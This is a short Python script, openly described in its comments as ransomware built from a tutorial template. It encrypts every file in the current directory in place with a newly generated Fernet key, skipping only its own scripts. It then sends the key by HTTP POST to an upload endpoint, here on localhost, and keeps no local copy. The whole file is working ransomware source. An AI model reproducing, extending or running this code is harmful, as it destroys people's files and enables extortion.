import os
from cryptography.fernet import Fernet
from pathlib import Path
import threading
import requests

# I used NetworkChuck's ransomware template for this and now im going to improve it maybe?
# Made By SQL 2026




files = [] # This will have all the enumerated files.

for file in os.listdir(): # Put all files into list list
    if file in {"main.py", "secret.key", "decrypt.py", "test.py"}:
        continue
    
    if os.path.isfile(file):
        files.append(file)

    
encryption_key = Fernet.generate_key() # This is the important key



for file in files:  # Encryption Magic.
    with open(file, "rb") as thefile:
        file_content = thefile.read()

    contents_encrypted = Fernet(encryption_key).encrypt(file_content) 

    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


# we should add a check to see if the webserver is even online in the Future!
response = requests.post(
    "http://127.0.0.1:8000/upload/upload.php",
    data=encryption_key
)

# i guess add text for other status codes?
if response.status_code == 200:
    print(f"{response.status_code} OK!")
else:
    print(response.status_code)

print(response.text)